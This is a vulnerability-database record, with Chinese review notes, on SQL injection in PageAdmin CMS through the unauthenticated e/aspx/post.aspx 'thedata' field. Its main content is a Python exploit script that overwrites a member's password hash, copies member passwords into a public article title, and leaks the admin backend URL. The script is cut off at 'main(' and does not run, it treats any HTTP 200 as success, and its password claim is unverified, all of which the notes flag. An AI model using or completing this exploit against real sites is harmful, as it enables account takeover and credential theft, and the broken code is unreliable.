---
source: "hatch 补库批 20260928"
product: "PageAdmin CMS（标题PageMyAdmin疑误名）"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "PageMyAdmin sql注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：e/aspx/post.aspx thedata指令接口接受未认证更新；固定表/文章id747/会员id2"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-32c8c61cfbe00b8d298bda74"
entity_id: "ve-32c8c61cfbe00b8d298bda74"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：e/aspx/post.aspx thedata指令接口接受未认证更新；固定表/文章id747/会员id2

- **适用与权限边界（1）**：脚本Referer pageadmin_cms与pageadminsql.py指向PageAdmin，目录PageMyAdmin需纠正，非phpMyAdmin。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **代码与转录边界（2）**：全文结尾main(截断导致语法错误，无版本/来源/原理/响应。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **结论使用边界（3）**：HTTP200直接报改密/注入成功是不充分判据；三模式会改会员密码或文章标题，非无损检测。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（4）**：固定账号hash与宣布明文关系未核验，参数upass/uppass拼写冲突。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# PageMyAdmin sql注入漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### poc

    #!/usr/bin/env python
    # -*- coding: utf-8 -*-


    import urllib2
    import urllib
    import re
    import sys

    def main():
        url=sys.argv[1]+"/e/aspx/post.aspx"
        fun=sys.argv[2]
        if fun=='upass':
            update(url)
        elif fun=='sqlinject':
            sqlinject(url)
        elif fun=='Backstage':
            Backstage(url)
        else:
            print'''
            usage: pageadminsql.py http://www.baidu.com/ upass
            parameter: uppass sqlinject Backstage
            '''
    def update(url):
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":url+"?a=pageadmin_cms"}
        formate={
        "siteid":"1",
        "formtable":"1",
        "thedata":'[u][k]pa_member[k][s][k]userpassword="1527f10a11de5efea4b8516213413c103df55126"[k]where[k]id=2'
        }
        postdata = urllib.urlencode(formate)
        request = urllib2.Request(url, data=postdata, headers = headers)
        try:
            response = urllib2.urlopen(request)
            if response.getcode()==200:
                print u">>>>>>修改密码成功 修改密码：admin_1234213<<<<<<"
                pass
        except Exception as e:
            print u">>>>>>修改密码失败<<<<<<"
            pass
    def sqlinject(url):
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":url+"?a=pageadmin_cms"}
        formate={
        "siteid":"1",
        "formtable":"1",
        "thedata":"[u][k]article,pa_member[k][s][k]article.title=pa_member.userpassword[k]where[k]article.id=747"
        }
        postdata = urllib.urlencode(formate)
        request = urllib2.Request(url, data=postdata, headers = headers)
        try:
            response = urllib2.urlopen(request)
            if response.getcode()==200:
                print u">>>>>>密码注入成功 查看密码地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747<<<<<<".format(sys.argv[1])
                pass
        except Exception as e:
            print u">>>>>>密码注入失败<<<<<<"
            pass
    def Backstage(url):
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer":url+"?a=pageadmin_cms"}
        formate={
        "siteid":"1",
        "formtable":"1",
        "thedata":"[u][k]article,pa_log[k][s][k]article.title=pa_log.url[k]where[k]article.id=747"
        }
        postdata = urllib.urlencode(formate)
        request = urllib2.Request(url, data=postdata, headers = headers)
        try:
            response = urllib2.urlopen(request)
            if response.getcode()==200:
                print u">>>>>>后台地址注入成功 查看后台地址：{0}/index.aspx?lanmuid=63&sublanmuid=654&id=747<<<<<<".format(sys.argv[1])
                pass
        except Exception as e:
            print u">>>>>>后台地址注入失败<<<<<<"
            pass
    if __name__ == '__main__':
        main(
